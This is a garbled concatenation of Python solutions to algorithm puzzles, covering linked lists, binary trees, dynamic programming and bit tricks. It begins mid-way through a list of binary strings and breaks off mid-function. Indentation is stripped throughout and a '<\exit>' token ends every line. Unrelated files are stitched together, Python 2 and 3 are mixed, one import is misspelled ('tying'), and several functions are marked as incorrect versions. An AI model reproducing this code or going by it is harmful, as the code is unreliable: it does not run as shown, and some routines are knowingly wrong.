1101111111100111110111111001111011010111111101011011100100111011110111110111110111111101111111110","01011111011111111101110111011111010111111111101111101111111011111110111100111010111111011111111111111011100101101101111001111011111011111111111011011111110100011111001111011111111100110111111111111111","01111000110111011110111111111111110110111100101111111011111110011011111111010111111011000010011111101110011010111111110111110011111111111110111111111111110011101111110111111101111111111111111111111111","10110111001111010111010011011111011111111101111110011111110011111011101111111111001101010001111111111111110111111001111101011111111011111101110111101111111100101011101111111101111111011111101101111101","11111110001111111110101111101111100011011111110111111111111111011011010101110101111011011111001111111101110110111111110111110101111111111001011111111011010110011110111111011111011110111111111110111111","01111110011110111011110111011111111111111101110111111110110111001110111011111111111111101111111011011111111101111110000111111111100111101111110011011001111110111011111001111000101001111111111111111111","11111111111110111011111111111110101011111110111110101001111111111011111111100011110011111110011110111111111101110111111110111101111111011111101111111101011111011110111110111111101111111110111111111101","11111011011010111111111111101111101001100001011100111011110111011111110100011110111111110111110111111110111110111110001100111110011111101111001111110100111101100111111010110101111001111001111100111111","11011111110101111111110100111111111111111011110111111111111110111010011111110111110000111011111101101111001111101100111111101111111101101010110111111111111011111001111110110101011100011111101101011010","01100101111111101100011001111011111111110111111001100100111011101111111001111001111101111010101111110101110111110101011111101111100110111111111111111011111101111111111111111111110110011101111111111111","10111111110111101110111111100111101011110111110111100111111111101100011101111111011011111111101011001111111111011111011101011111111111111110111111110111011111111011011111110110111111111111011011011100","11111111111111111111111001110111110101110101100011111111110111101011110100110111001111101111110111000000111110010011100111101010111101111111111111111011110111111101110111101111010111111111111111101111","10101110111101011111111110111110011111111010011101111111011110111111101101011111100111111101010111111101100011101111111011111111110110110111011111111111111111101111110111111111111101110111011111100011","10111110111111101111011111110101111101011110000101100111111101111011111110111111101111110101110011111000101101110011110100111011001111111011000001110011011110110110111011111111101011111111001111111010","10111110110101001101011111111011011111100100000101111111111110111111110000110111111011111110001111100101111110101110011110011111111101111101011111111111110011111101111111110111011111001011011111111111","01100110111001111111111011100100110100111111001111110111100110111100111111111100111111101110100110011110111101111111111110000011111111100110111111111110110101101111000001001111011111110111010111011101","11101011111011110010110110101010111010001111110111011110110111111111111001111111011100111101100011111111111101101111111111000001111111011111011111101110110110110111110111111101111100111111111111111111","11110100011110111101011111011110111001100110111111111111111110011111110011011101111111111010011011011001111101010111111111111111111011110011111111110111011011111111011111101110011011110011110111111110","11110111111111110110111111000011111101110101111100110011111111101111011011101111001010111010111111111111110011111111111111111101110101110111111001111100111111001011111011111100111011011101111111001111","01111011111111111011011101111111111111001111101001010111111111011101101010110011111110101010001111100101011111111101111011111010110110110111111111111110010110111111100111111000111011010010011111111101","01111111111011110110011110101111110001110111111111111001111111010111011001110111111111111011110011111101011001111110111110011111010101101111101111111110111000001011110111101111111111111111011111111111"])==48<\exit>
class Solution:<\exit>
def isScramble(self, s1, s2):<\exit>
if len(s1)!=len(s2):<\exit>
return False<\exit>
chars = [0 for _ in xrange(26)]<\exit>
for char in s1:<\exit>
chars[ord(char)-ord('a')] += 1<\exit>
for char in s2:<\exit>
chars[ord(char)-ord('a')] -= 1<\exit>
for val in chars:<\exit>
if val!=0:<\exit>
return False<\exit>
if len(s1)==1:<\exit>
return True<\exit>
for i in xrange(1, len(s1)):<\exit>
if self.isScramble(s1[:i], s2[:i]) and self.isScramble(s1[i:], s2[i:]) or \<\exit>
self.isScramble(s1[:i], s2[-i:]) and self.isScramble(s1[i:], s2[:len(s2)-i]):<\exit>
return True<\exit>
return False<\exit>
if __name__=="__main__":<\exit>
assert Solution().isScramble("abc", "bca")==True<\exit>
class ListNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.next = None<\exit>
def __repr__(self):<\exit>
return repr(self.val)<\exit>
class Solution:<\exit>
def partition(self, head, x):<\exit>
dummy = ListNode(0)<\exit>
dummy.next = head<\exit>
dummy_smaller = ListNode(0)<\exit>
dummy_larger = ListNode(0)<\exit>
pre = dummy<\exit>
pre_smaller = dummy_smaller<\exit>
pre_larger = dummy_larger<\exit>
while pre.next:<\exit>
cur = pre.next<\exit>
if cur.val<x:<\exit>
pre_smaller.next = cur<\exit>
pre_smaller = pre_smaller.next<\exit>
else:<\exit>
pre_larger.next = cur<\exit>
pre_larger = pre_larger.next<\exit>
pre = pre.next<\exit>
pre_larger.next = None<\exit>
pre_smaller.next = dummy_larger.next<\exit>
return dummy_smaller.next<\exit>
if __name__=="__main__":<\exit>
lst = [ListNode(2), ListNode(1)]<\exit>
for ind in xrange(len(lst)-1):<\exit>
lst[ind].next = lst[ind+1]<\exit>
Solution().partition(lst[0], 2)<\exit>
class Solution(object):<\exit>
def merge(self, A, m, B, n):<\exit>
i = m-1<\exit>
j = n-1<\exit>
closed = m+n<\exit>
while i >= 0 and j >= 0:<\exit>
closed -= 1<\exit>
if A[i] > B[j]:<\exit>
A[closed] = A[i]<\exit>
i -= 1<\exit>
else:<\exit>
A[closed] = B[j]<\exit>
j -= 1<\exit>
if j >= 0: A[:closed] = B[:j+1]<\exit>
class Solution:<\exit>
def grayCode(self, n):<\exit>
if n==0:<\exit>
return [0]<\exit>
result = [0, 1]<\exit>
for num_of_bit in range(2, n+1):<\exit>
msb = 1<<num_of_bit-1<\exit>
for element in reversed(result):<\exit>
result.append(msb+element)<\exit>
return result<\exit>
def grayCode_math(self, n):<\exit>
return [(x>>1)^x for x in xrange(1<<n)]<\exit>
class Solution:<\exit>
def subsetsWithDup(self, S):<\exit>
S.sort()<\exit>
result = []<\exit>
self.get_subset(S, [], result)<\exit>
return result<\exit>
def get_subset(self, S, current, result):<\exit>
result.append(current)<\exit>
for ind, val in enumerate(S):<\exit>
if ind-1>=0 and val==S[ind-1]:<\exit>
continue<\exit>
self.get_subset(S[ind+1:], current+[val], result)<\exit>
if __name__=="__main__":<\exit>
print Solution().subsetsWithDup([1, 2, 3])<\exit>
class Solution(object):<\exit>
def numDecodings(self, s):<\exit>
if s.startswith("0"):<\exit>
return 0<\exit>
n = len(s)<\exit>
if not s:<\exit>
return 0<\exit>
F = [0 for _ in xrange(n+1)]<\exit>
F[0] = 1<\exit>
F[1] = 1<\exit>
for i in xrange(2, n+1):<\exit>
if s[i-1] != "0":<\exit>
F[i] = F[i-1]<\exit>
if 10 <= int(s[i-2]+s[i-1]) < 27:<\exit>
F[i] += F[i-2]<\exit>
else:<\exit>
if s[i-2] in ("1", "2"):<\exit>
F[i] = F[i-2]<\exit>
else:<\exit>
return 0<\exit>
return F[-1]<\exit>
if __name__ == "__main__":<\exit>
assert Solution().numDecodings("10") == 1<\exit>
assert Solution().numDecodings("27") == 1<\exit>
assert Solution().numDecodings("12") == 2<\exit>
assert Solution().numDecodings("0") == 0<\exit>
class ListNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.next = None<\exit>
class Solution:<\exit>
def reverseBetween(self, head: ListNode, m: int, n: int) -> ListNode:<\exit>
prev = None<\exit>
cur = head<\exit>
l = 1<\exit>
while l < m:<\exit>
nxt = cur.next<\exit>
prev = cur<\exit>
cur = nxt<\exit>
l += 1<\exit>
leftend = prev<\exit>
rightend = cur<\exit>
while l <= n:<\exit>
nxt = cur.next<\exit>
cur.next = prev<\exit>
prev = cur<\exit>
cur = nxt<\exit>
l += 1<\exit>
if m != 1:<\exit>
leftend.next = prev<\exit>
else:<\exit>
head = prev<\exit>
rightend.next = cur<\exit>
return head<\exit>
class ListNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.next = None<\exit>
def __repr__(self):<\exit>
return repr(self.val)<\exit>
def __str__(self):<\exit>
return str(self.val)+", "+str(self.next)<\exit>
class Solution:<\exit>
def reverseBetween(self, head, m, n):<\exit>
if not head or m>=n:<\exit>
return head<\exit>
dummy = ListNode(0)<\exit>
dummy.next = head<\exit>
cnt = 1<\exit>
pre = dummy<\exit>
start_pre = None<\exit>
start = None<\exit>
cur = pre.next<\exit>
while pre.next:<\exit>
if cnt==m:<\exit>
start_pre = pre<\exit>
start = cur<\exit>
elif m<cnt<=n:<\exit>
cur.next, pre, cur = pre, cur, cur.next<\exit>
cnt += 1<\exit>
continue<\exit>
elif cnt==n+1:<\exit>
end = pre<\exit>
start_pre.next = end<\exit>
start.next = cur<\exit>
break<\exit>
pre = pre.next<\exit>
cur = cur.next<\exit>
cnt += 1<\exit>
return dummy.next<\exit>
if __name__=="__main__":<\exit>
length = 3<\exit>
lst = [ListNode(i+1) for i in range(length)]<\exit>
for i in xrange(length-1):<\exit>
lst[i].next = lst[i+1]<\exit>
print Solution().reverseBetween(lst[0], 1, 3)<\exit>
class Solution:<\exit>
def restoreIpAddresses(self, s):<\exit>
result = []<\exit>
self.dfs(s, [], result)<\exit>
return result<\exit>
def dfs_complicated(self, seq, cur, result):<\exit>
if len(cur) > 4:<\exit>
return<\exit>
if not cur or self.is_valid(cur[-1]):<\exit>
if len(cur) == 4 and not seq:<\exit>
result.append(".".join(cur))<\exit>
return<\exit>
for i in xrange(1, min(3, len(seq))+1):<\exit>
self.dfs(seq[i:], cur+[seq[:i]], result)<\exit>
def dfs(self, seq, cur, result):<\exit>
if not seq and len(cur)==4:<\exit>
result.append(".".join(cur))<\exit>
return<\exit>
for i in xrange(1, min(3, len(seq)) + 1):<\exit>
new_seg = seq[:i]<\exit>
if len(cur) < 4 and self.is_valid(new_seg):<\exit>
self.dfs(seq[i:], cur + [new_seg], result)<\exit>
else:<\exit>
return<\exit>
def is_valid(self, s):<\exit>
if not s:<\exit>
return False<\exit>
return s == "0" or s[0]!="0" and 0<= int(s) <256<\exit>
if __name__=="__main__":<\exit>
IP = "25525511135"<\exit>
print Solution().restoreIpAddresses(IP)<\exit>
import math<\exit>
class Solution(object):<\exit>
def numTrees_math(self, n):<\exit>
return math.factorial(2*n)/(math.factorial(n)*math.factorial(n))-math.factorial(2*n)/(<\exit>
math.factorial(n+1)*math.factorial(n-1))<\exit>
def numTrees(self, n):<\exit>
if n < 2:<\exit>
return n<\exit>
dp = [0 for _ in xrange(n+1)]<\exit>
dp[0] = 1<\exit>
for i in xrange(1, n+1):<\exit>
for j in xrange(i):<\exit>
dp[i] += dp[j]*dp[i-j-1]<\exit>
return dp[-1]<\exit>
if __name__ == "__main__":<\exit>
assert Solution().numTrees(100) == Solution().numTrees_math(100)<\exit>
class TreeNode(object):<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution(object):<\exit>
def inorderTraversal(self, root):<\exit>
ret = []<\exit>
cur = root<\exit>
while cur:<\exit>
if not cur.left:<\exit>
ret.append(cur.val)<\exit>
cur = cur.right<\exit>
else:<\exit>
pre = cur.left<\exit>
while pre.right and pre.right != cur:<\exit>
pre = pre.right<\exit>
if not pre.right:<\exit>
pre.right = cur<\exit>
cur = cur.left<\exit>
else:<\exit>
pre.right = None<\exit>
ret.append(cur.val)<\exit>
cur = cur.right<\exit>
return ret<\exit>
def inorderTraversal_memory(self, root):<\exit>
lst = []<\exit>
self.inorderTraverse_itr(root, lst)<\exit>
return lst<\exit>
def inorderTraverse(self, root, lst):<\exit>
if not root:<\exit>
return<\exit>
self.inorderTraverse(root.left, lst)<\exit>
lst.append(root.val)<\exit>
self.inorderTraverse(root.right, lst)<\exit>
def inorderTraverse_itr(self, root, lst):<\exit>
if not root:<\exit>
return<\exit>
cur = root<\exit>
stk = []<\exit>
while stk or cur:<\exit>
while cur:<\exit>
stk.append(cur)<\exit>
cur = cur.left<\exit>
cur = stk.pop()<\exit>
lst.append(cur.val)<\exit>
cur = cur.right<\exit>
class TreeNode(object):<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution(object):<\exit>
def __init__(self):<\exit>
self.cache = {}<\exit>
def generateTrees(self, n):<\exit>
if n == 0:<\exit>
return [None]<\exit>
return self.generate_cache(1, n)<\exit>
def generate_cache(self, start, end):<\exit>
if (start, end) not in self.cache:<\exit>
roots = []<\exit>
if start > end:<\exit>
roots.append(None)<\exit>
return roots<\exit>
for pivot in range(start, end+1):<\exit>
left_roots = self.generate_cache(start, pivot-1)<\exit>
right_roots = self.generate_cache(pivot+1, end)<\exit>
for left_root in left_roots:<\exit>
for right_root in right_roots:<\exit>
root = TreeNode(pivot)<\exit>
root.left = left_root<\exit>
root.right = right_root<\exit>
roots.append(root)<\exit>
self.cache[(start, end)] = roots<\exit>
return self.cache[(start, end)]<\exit>
def generate(self, start, end):<\exit>
subtree_roots = []<\exit>
if start > end:<\exit>
subtree_roots.append(None)<\exit>
return subtree_roots<\exit>
for pivot in range(start, end+1):<\exit>
left_subtree_roots = self.generate(start, pivot-1)<\exit>
right_subtree_roots = self.generate(pivot+1, end)<\exit>
for left_node in left_subtree_roots:<\exit>
for right_node in right_subtree_roots:<\exit>
pivot_node = TreeNode(pivot)<\exit>
pivot_node.left = left_node<\exit>
pivot_node.right = right_node<\exit>
subtree_roots.append(pivot_node)<\exit>
return subtree_roots<\exit>
class Solution(object):<\exit>
def isInterleave(self, s1, s2, s3):<\exit>
m = len(s1)<\exit>
n = len(s2)<\exit>
if m+n != len(s3):<\exit>
return False<\exit>
dp = [[False for _ in xrange(n+1)] for _ in xrange(m+1)]<\exit>
dp[0][0] = True<\exit>
for i in xrange(1, m+1):<\exit>
dp[i][0] = dp[i-1][0] and s3[i+0-1] == s1[i-1]<\exit>
for j in xrange(1, n+1):<\exit>
dp[0][j] = dp[0][j-1] and s3[0+j-1] == s2[j-1]<\exit>
for i in xrange(1, m+1):<\exit>
for j in xrange(1, n+1):<\exit>
if not dp[i][j]:<\exit>
dp[i][j] = dp[i-1][j] and s3[i+j-1] == s1[i-1]<\exit>
if not dp[i][j]:<\exit>
dp[i][j] = dp[i][j-1] and s3[i+j-1] == s2[j-1]<\exit>
return dp[-1][-1]<\exit>
def isInterleave_TLE(self, s1, s2, s3):<\exit>
if not s3:<\exit>
return True<\exit>
letter = s3[0]<\exit>
if s1 and s1[0] == letter:<\exit>
if self.isInterleave(s1[1:], s2, s3[1:]):<\exit>
return True<\exit>
if s2 and s2[0] == letter:<\exit>
if self.isInterleave(s1, s2[1:], s3[1:]):<\exit>
return True<\exit>
return False<\exit>
if __name__ == "__main__":<\exit>
assert Solution().isInterleave("aa", "ab", "abaa") == True<\exit>
assert Solution().isInterleave("aabcc", "dbbca", "aadbbcbcac") == True<\exit>
assert Solution().isInterleave("aabcc", "dbbca", "aadbbbaccc") == False<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution:<\exit>
def isValidBST(self, root):<\exit>
if not root:<\exit>
return True<\exit>
if not self.isValidBST(root.left):<\exit>
return False<\exit>
if not self.isValidBST(root.right):<\exit>
return False<\exit>
if root.left:<\exit>
if not self.get_largest(root.left) < root.val:<\exit>
return False<\exit>
if root.right:<\exit>
if not root.val < self.get_smallest(root.right):<\exit>
return False<\exit>
return True<\exit>
def get_largest(self, root):<\exit>
if not root.right:<\exit>
return root.val<\exit>
return self.get_largest(root.right)<\exit>
def get_smallest(self, root):<\exit>
if not root.left:<\exit>
return root.val<\exit>
return self.get_smallest(root.left)<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
def __repr__(self):<\exit>
return repr(self.val)<\exit>
class Solution:<\exit>
def __init__(self):<\exit>
self.swapped_pair = []<\exit>
self.current = None<\exit>
self.pre = None<\exit>
def recoverTree(self, root):<\exit>
self.in_order(root)<\exit>
if len(self.swapped_pair)==2:<\exit>
self.swapped_pair[0][0].val, self.swapped_pair[1][1].val = self.swapped_pair[1][1].val, self.swapped_pair[0][0].val<\exit>
else:<\exit>
self.swapped_pair[0][0].val, self.swapped_pair[0][1].val = self.swapped_pair[0][1].val, self.swapped_pair[0][0].val<\exit>
return root<\exit>
def in_order(self, current):<\exit>
if not current:<\exit>
return<\exit>
self.in_order(current.left)<\exit>
self.pre = self.current<\exit>
self.current = current<\exit>
if self.pre and not self.pre.val<self.current.val:<\exit>
if not self.swapped_pair:<\exit>
self.swapped_pair.append((self.pre, self.current))<\exit>
else:<\exit>
self.swapped_pair.append((self.pre, self.current))<\exit>
self.in_order(current.right)<\exit>
if __name__=="__main__":<\exit>
node1 = TreeNode(2)<\exit>
node2 = TreeNode(1)<\exit>
node1.right = node2<\exit>
print Solution().recoverTree(node1)<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution:<\exit>
def isSameTree(self, p, q):<\exit>
if not p and not q:<\exit>
return True<\exit>
try:<\exit>
if p.val==q.val and self.isSameTree(p.left, q.left) and self.isSameTree(p.right, q.right):<\exit>
return True<\exit>
except AttributeError:<\exit>
return False<\exit>
return False<\exit>
from typing import List<\exit>
from functools import lru_cache<\exit>
class Solution:<\exit>
def mergeStones(self, stones: List[int], K: int) -> int:<\exit>
N = len(stones)<\exit>
sums = [0]<\exit>
for s in stones:<\exit>
sums.append(sums[-1] + s)<\exit>
@lru_cache(None)<\exit>
def F(i, j, m):<\exit>
if i >= j or m < 1:<\exit>
return float("inf")<\exit>
n = j - i<\exit>
if (n - m) % (K - 1) != 0:<\exit>
return float("inf")<\exit>
if j == i + 1:<\exit>
if m == 1:<\exit>
return 0<\exit>
return float("inf")<\exit>
if m == 1:<\exit>
return F(i, j, K) + sums[j] - sums[i]<\exit>
ret = min(<\exit>
F(i, mid, 1) + F(mid, j, m - 1)<\exit>
for mid in range(i + 1, j, K - 1)<\exit>
)<\exit>
return ret<\exit>
ret = F(0, N, 1)<\exit>
return ret if ret != float("inf") else -1<\exit>
if __name__ == "__main__":<\exit>
assert Solution().mergeStones([3,5,1,2,6], 3) == 25<\exit>
import string<\exit>
from typing import List<\exit>
from collections import Counter<\exit>
class Solution:<\exit>
def commonChars(self, A: List[str]) -> List[str]:<\exit>
ret = []<\exit>
if not A:<\exit>
return ret<\exit>
counter = Counter(A[0])<\exit>
for a in A[1:]:<\exit>
cur = Counter(a)<\exit>
for c in string.ascii_lowercase:<\exit>
counter[c] = min(counter[c], cur[c])<\exit>
for c in string.ascii_lowercase:<\exit>
if counter[c] > 0:<\exit>
ret.extend([c] * counter[c])<\exit>
return ret<\exit>
from typing import List<\exit>
class Solution:<\exit>
def longestOnes(self, A: List[int], K: int) -> int:<\exit>
i, j = 0, 0<\exit>
cnt_0 = 0<\exit>
n = len(A)<\exit>
ret = 0<\exit>
while i < n and j < n:<\exit>
while j < n:<\exit>
if A[j] == 0 and cnt_0 < K:<\exit>
j += 1<\exit>
cnt_0 += 1<\exit>
elif A[j] == 1:<\exit>
j += 1<\exit>
else:<\exit>
break<\exit>
ret = max(ret, j - i)<\exit>
if A[i] == 0:<\exit>
cnt_0 -= 1<\exit>
i += 1<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().longestOnes([1,1,1,0,0,0,1,1,1,1,0], 2) == 6<\exit>
from typing import List<\exit>
class Solution:<\exit>
def largestSumAfterKNegations(self, A: List[int], K: int) -> int:<\exit>
A.sort()<\exit>
for i in range(len(A)):<\exit>
if K == 0:<\exit>
break<\exit>
if A[i] < 0:<\exit>
A[i] *= -1<\exit>
prev = A[i]<\exit>
K -= 1<\exit>
else:<\exit>
if K % 2 != 0:<\exit>
if i - 1 >= 0 and A[i-1] < A[i]:<\exit>
A[i-1] *= -1<\exit>
else:<\exit>
A[i] *= -1<\exit>
break<\exit>
return sum(A)<\exit>
from typing import List<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution:<\exit>
def bstFromPreorder2(self, preorder: List[int]) -> TreeNode:<\exit>
root = TreeNode(preorder[0])<\exit>
stk = [root]<\exit>
for a in preorder[1:]:<\exit>
node = TreeNode(a)<\exit>
if a < stk[-1].val:<\exit>
stk[-1].left = node<\exit>
else:<\exit>
while len(stk) >= 2 and stk[-2].val < a:<\exit>
stk.pop()<\exit>
stk[-1].right = node<\exit>
stk.pop()<\exit>
stk.append(node)<\exit>
return root<\exit>
def bstFromPreorder(self, preorder: List[int]) -> TreeNode:<\exit>
root = TreeNode(preorder[0])<\exit>
stk = [root]<\exit>
for a in preorder[1:]:<\exit>
node = TreeNode(a)<\exit>
if a < stk[-1].val:<\exit>
stk[-1].left = node<\exit>
else:<\exit>
while stk and stk[-1].val < a:<\exit>
pi = stk.pop()<\exit>
pi.right = node<\exit>
stk.append(node)<\exit>
return root<\exit>
class Solution:<\exit>
def bitwiseComplement(self, N: int) -> int:<\exit>
mask = 1<\exit>
cur = N<\exit>
while cur >> 1:<\exit>
cur >>= 1<\exit>
mask <<= 1<\exit>
mask += 1<\exit>
return ~N & mask<\exit>
class TreeNode(object):<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution(object):<\exit>
def isSymmetric(self, root):<\exit>
if not root:<\exit>
return True<\exit>
return self.isSymmetrical(root.left, root.right)<\exit>
def isSymmetrical(self, l, r):<\exit>
if not l and not r:<\exit>
return True<\exit>
if (l and r and<\exit>
l.val == r.val and self.isSymmetrical(l.left, r.right) and self.isSymmetrical(l.right, r.left)):<\exit>
return True<\exit>
return False<\exit>
from typing import List<\exit>
from collections import defaultdict<\exit>
class Solution:<\exit>
def numPairsDivisibleBy60(self, time: List[int]) -> int:<\exit>
counter = defaultdict(int)<\exit>
ret = 0<\exit>
for t in time:<\exit>
ret += counter[(60 - t) % 60]<\exit>
counter[t % 60] += 1<\exit>
return ret<\exit>
def numPairsDivisibleBy60_error(self, time: List[int]) -> int:<\exit>
hm = defaultdict(int)<\exit>
for t in time:<\exit>
hm[t % 60] += 1<\exit>
ret = 0<\exit>
for k, v in hm.items():<\exit>
if k == 0:<\exit>
ret += (v * (v - 1)) // 2<\exit>
elif k <= 60 - k:<\exit>
v2 =  hm[60 - k]<\exit>
ret += v2 * v<\exit>
return ret<\exit>
from tying import List<\exit>
class Solution:<\exit>
def shipWithinDays(self, weights: List[int], D: int) -> int:<\exit>
lo = max(weights)<\exit>
hi = sum(weights)<\exit>
while lo < hi:<\exit>
mid = (lo + hi) // 2<\exit>
cnt = 1<\exit>
cur = 0<\exit>
for w in weights:<\exit>
cur += w<\exit>
if cur > mid:<\exit>
cnt += 1<\exit>
cur = w<\exit>
if cnt > D:<\exit>
lo = mid + 1<\exit>
else:<\exit>
hi = mid<\exit>
return lo<\exit>
from typing import List<\exit>
class Solution:<\exit>
def canThreePartsEqualSum(self, A: List[int]) -> bool:<\exit>
s = sum(A)<\exit>
if s % 3 != 0:<\exit>
return False<\exit>
target = s // 3<\exit>
count = 0<\exit>
cur_sum = 0<\exit>
for a in A:<\exit>
cur_sum += a<\exit>
if cur_sum == target:<\exit>
count += 1<\exit>
cur_sum = 0<\exit>
return count == 3 and cur_sum == 0<\exit>
if __name__ == "__main__":<\exit>
assert Solution().canThreePartsEqualSum([3,3,6,5,-2,2,5,1,-9,4]) == True<\exit>
from typing import List<\exit>
class Solution:<\exit>
def maxScoreSightseeingPair(self, A: List[int]) -> int:<\exit>
ret = -float("inf")<\exit>
prev_max = A[0]<\exit>
for a in A[1:]:<\exit>
ret = max(ret, prev_max - 1 + a)<\exit>
prev_max = max(prev_max - 1, a)<\exit>
return ret<\exit>
def maxScoreSightseeingPair_error(self, A: List[int]) -> int:<\exit>
n = len(A)<\exit>
B = []<\exit>
for i in range(n):<\exit>
B.append(A[i] - i)<\exit>
m1, m2 = None, None<\exit>
for i in range(n):<\exit>
if m1 is None:<\exit>
m1 = i<\exit>
elif m2 is None:<\exit>
m2 = i<\exit>
elif B[i] + (i - m1) > B[m1]:<\exit>
m1 = i<\exit>
elif B[i] + (i - m2) > B[m2]:<\exit>
m2 = i<\exit>
return A[m2] + A[m1] - abs(m2 - m1)<\exit>
if __name__ == "__main__":<\exit>
assert Solution().maxScoreSightseeingPair([8,1,5,2,6]) == 11<\exit>
from collections import deque<\exit>
class Solution:<\exit>
def baseNeg2(self, N: int) -> str:<\exit>
ret = deque()<\exit>
while N != 0:<\exit>
r = N % 2<\exit>
ret.appendleft(r)<\exit>
N -= r<\exit>
N //= -2<\exit>
return "".join(map(str, ret)) or "0"<\exit>
if __name__ == "__main__":<\exit>
assert Solution().baseNeg2(3) == "111"<\exit>
assert Solution().baseNeg2(4) == "100"<\exit>
from typing import List<\exit>
class Solution:<\exit>
def prefixesDivBy5(self, A: List[int]) -> List[bool]:<\exit>
cur = 0<\exit>
ret = []<\exit>
for a in A:<\exit>
cur = (cur << 1) + a<\exit>
cur %= 5<\exit>
if cur == 0:<\exit>
ret.append(True)<\exit>
else:<\exit>
ret.append(False)<\exit>
return ret<\exit>
class ListNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.next = None<\exit>
from typing import List<\exit>
class Solution:<\exit>
def nextLargerNodes(self, head: ListNode) -> List[int]:<\exit>
ret = []<\exit>
stk = []<\exit>
i = 0<\exit>
cur = head<\exit>
while cur:<\exit>
while stk and stk[-1][1] < cur.val:<\exit>
idx, _ = stk.pop()<\exit>
ret[idx] = cur.val<\exit>
stk.append([i, cur.val])<\exit>
ret.append(0)<\exit>
cur = cur.next<\exit>
i += 1<\exit>
return ret<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution:<\exit>
def levelOrder(self, root):<\exit>
result = []<\exit>
q = []<\exit>
if root:<\exit>
q.append(root)<\exit>
while q:<\exit>
length = len(q)<\exit>
for i in range(length):<\exit>
cur = q[i]<\exit>
if cur.left:<\exit>
q.append(cur.left)<\exit>
if cur.right:<\exit>
q.append(cur.right)<\exit>
result.append(map(lambda x: x.val, q[:length]))<\exit>
q = q[length:]<\exit>
return result<\exit>
if __name__=="__main__":<\exit>
nodes = [TreeNode(i) for i in range(3)]<\exit>
nodes[0].left = nodes[1]<\exit>
nodes[1].left = nodes[2]<\exit>
print Solution().levelOrder(nodes[0])<\exit>
from typing import List<\exit>
dirs = ((0, -1), (0, 1), (1, 0), (-1, 0))<\exit>
class Solution:<\exit>
def numEnclaves(self, A: List[List[int]]) -> int:<\exit>
m, n = len(A), len(A[0])<\exit>
visited = [[False for _ in range(n)] for _ in range(m)]<\exit>
for i in range(m):<\exit>
for j in range(n):<\exit>
if not visited[i][j] and A[i][j] == 1 and (i == 0 or j == 0 or i == m - 1 or j == n - 1):<\exit>
self.dfs(A, i, j, visited)<\exit>
ret = 0<\exit>
for i in range(m):<\exit>
for j in range(n):<\exit>
if A[i][j] == 1 and not visited[i][j]:<\exit>
ret += 1<\exit>
return ret<\exit>
def dfs(self, A, i, j, visited):<\exit>
m, n = len(A), len(A[0])<\exit>
visited[i][j] = True<\exit>
for di, dj in dirs:<\exit>
I = i + di<\exit>
J = j + dj<\exit>
if 0 <= I < m and 0 <= J < n and not visited[I][J] and A[I][J] == 1:<\exit>
self.dfs(A, I, J, visited)<\exit>
class SolutionError:<\exit>
def __init__(self):<\exit>
self.ret = 0<\exit>
def numEnclaves(self, A: List[List[int]]) -> int:<\exit>
m, n = len(A), len(A[0])<\exit>
visited = [[None for _ in range(n)] for _ in range(m)]<\exit>
for i in range(m):<\exit>
for j in range(n):<\exit>
if not visited[i][j] and A[i][j] == 1:<\exit>
self.dfs(A, i, j, visited)<\exit>
return self.ret<\exit>
def dfs(self, A, i, j, visited):<\exit>
m, n = len(A), len(A[0])<\exit>
visited[i][j] = 0<\exit>
for di, dj in dirs:<\exit>
I = i + di<\exit>
J = j + dj<\exit>
if not (0 <= I < m and 0 <= J < n):<\exit>
visited[i][j] = 1<\exit>
return True<\exit>
if visited[I][J] == 1:<\exit>
visited[i][j] = 1<\exit>
return True<\exit>
if visited[I][J] is None and A[I][J] == 1 and self.dfs(A, I, J, visited):<\exit>
visited[i][j] = 1<\exit>
return True<\exit>
self.ret += 1<\exit>
return False<\exit>
from collections import deque<\exit>
class Solution:<\exit>
def removeOuterParentheses(self, S: str) -> str:<\exit>
ret = []<\exit>
cnt = 0<\exit>
for e in S:<\exit>
if e == "(":<\exit>
cnt += 1<\exit>
if cnt > 1:<\exit>
ret.append(e)<\exit>
else:<\exit>
cnt -= 1<\exit>
if cnt > 0:<\exit>
ret.append(e)<\exit>
return "".join(ret)<\exit>
def removeOuterParentheses_error(self, S: str) -> str:<\exit>
ret = []<\exit>
stk = []<\exit>
cur_q = deque()<\exit>
for e in S:<\exit>
if e == "(":<\exit>
stk.append(e)<\exit>
else:<\exit>
prev = stk.pop()<\exit>
if stk:<\exit>
cur_q.appendleft(prev)<\exit>
cur_q.append(e)<\exit>
else:<\exit>
ret.extend(cur_q)<\exit>
cur_q = deque()<\exit>
return "".join(ret)<\exit>
if __name__ == "__main__":<\exit>
assert Solution().removeOuterParentheses("(()())(())(()(()))") == "()()()()(())"<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution:<\exit>
def __init__(self):<\exit>
self.ret = 0<\exit>
self.lst = []<\exit>
def sumRootToLeaf(self, root: TreeNode) -> int:<\exit>
self.dfs(root)<\exit>
return self.ret<\exit>
def dfs(self, node):<\exit>
if not node:<\exit>
return<\exit>
self.lst.append(node.val)<\exit>
if not node.left and not node.right:<\exit>
cur = 0<\exit>
for a in self.lst:<\exit>
cur <<= 1<\exit>
cur += a<\exit>
self.ret += cur<\exit>
else:<\exit>
self.dfs(node.left)<\exit>
self.dfs(node.right)<\exit>
self.lst.pop()<\exit>
from typing import List<\exit>
class Solution:<\exit>
def camelMatch(self, queries: List[str], pattern: str) -> List[bool]:<\exit>
ret = []<\exit>
